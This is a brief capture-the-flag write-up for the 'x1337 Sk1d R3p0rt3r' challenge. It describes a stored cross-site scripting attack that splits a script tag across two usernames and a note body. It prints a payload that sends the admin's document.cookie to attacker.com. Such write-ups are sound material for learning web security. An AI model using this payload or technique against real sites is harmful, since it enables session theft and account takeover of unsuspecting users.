# x1337 Sk1d R3p0rt3r Write Up

1. Register an account
2. Change your username to `*/</script`
3. Create a new note with whatever data
4. Change your username to `<script>/*`
5. Create a new note that follows this syntax: `*/ <PAYLOAD> /*` where `<PAYLOAD>` is the javascript snippet to fetch the admin session or fetching the contents of the note id #1.
	Note: Strings must use the \` to be declared as HTML encoding will break the script parsing
	```*/ new Image().src=`http://attacker.com/?c=`+document.cookie /*```
6. Click "send to admin" and wait for the payload to execute thus sending you the flag
